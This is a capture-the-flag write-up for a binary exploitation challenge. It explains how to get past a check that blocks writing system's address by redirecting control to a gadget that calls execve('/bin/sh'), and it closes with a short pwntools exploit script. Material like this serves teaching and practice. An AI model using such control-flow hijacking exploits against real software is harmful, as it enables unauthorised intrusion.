# Chal1

## Solution

Upon first glance, this challenge seems almost identical to the `type_confusion` problem. Thus, we first attempt to through the solution to that challenge at this one. Unfortunately, we get a strange result: `system crash`.

Upon close inspection of the binary to figure out why this is happening, we notice the following code:
```
00401d81                  if (memcmp(&rax_28[sx.q(var_58_1)], &data_402f17, 8) == 0)
00401d83                      int32_t var_48_2 = 1
00401d99                      printf(format: "system crash")
00401da3                      exit(status: 1)
00401da3                      noreturn
```
Essentially, the code exits the program if we try to set any quadword equal to the address of system. Hence, we need some creativity to avoid calling system directly. Luckily, we notice the following code in the binary:
```
004015cc      if (arg1 != 1)
00401635          exit(status: 1)
00401635          noreturn
004015d5      char const* const var_28 = "/bin/sh"
004015d9      int64_t var_20 = 0
004015f4      execve("/bin/sh", &var_28, 0, &var_28)
```
This will call `/bin/sh` for us, but it has a problem.: `arg1` needs to be set to `1`. Unfortunately, we can only set `arg1` to point to whatever we want, not set the value itself. Luckily, we find the following code:
```
0040184b  bf01000000         mov     edi, 0x1
00401850  e859fdffff         call    sub_401116
```
Thus, if we call this address, it should give us a shell. We do that using the following code:
```python
p = start()

p.sendlineafter(b">>>", b"2")
p.sendlineafter(b">>>", b"3")
p.sendlineafter(b">>>", b"0")
p.sendlineafter(b">>>", b"A"*16 + p64(0x31337) + p64(0x40184b))
p.sendlineafter(b">>>", b"4")
p.sendlineafter(b">>>", b"0")

p.interactive()
```